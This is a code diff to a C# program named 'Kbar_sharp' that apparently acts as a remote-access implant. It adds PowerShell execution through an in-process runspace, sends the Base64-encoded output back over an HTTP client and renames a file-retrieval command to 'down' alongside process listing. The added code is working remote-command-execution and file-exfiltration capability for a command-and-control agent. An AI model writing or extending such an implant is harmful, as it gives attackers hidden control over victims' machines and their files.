@@ -15,6 +15,9 @@ using System.Diagnostics;
 using System.ComponentModel;
 using System.Net;
 using System.Threading;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
 
 namespace Kbar_sharp
 {
@@ -221,9 +224,25 @@ namespace Kbar_sharp
             return Base64Encode(procret);
         }
 
-        static void powercom(string args)
+        static string powercom(string args)
         {
-            
+            Runspace runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+            RunspaceInvoke scriptInv = new RunspaceInvoke(runspace);
+            Pipeline pipe = runspace.CreatePipeline();
+
+            pipe.Commands.Add(args);
+
+            pipe.Commands.Add("Out-String");
+            Collection<PSObject> results = pipe.Invoke();
+            runspace.Close();
+            StringBuilder sb = new StringBuilder();
+
+            foreach(PSObject obj in results)
+            {
+                sb.Append(obj);
+            }
+            return Base64Encode(sb.ToString().Trim());
         }
 
         public static void executeCommand(String com, HttpClient cl)
@@ -261,11 +280,11 @@ namespace Kbar_sharp
                 case "proclist":
                     sendData(cl, proclist());
                     break;
-                case "get":
+                case "down":
                     sendBinaryData(cl, comDownload(arg));
                     break;
                 case "powershell":
-                    powercom(arg);
+                    sendData(cl, powercom(arg));
                     break;
                 default:
                     Console.WriteLine();
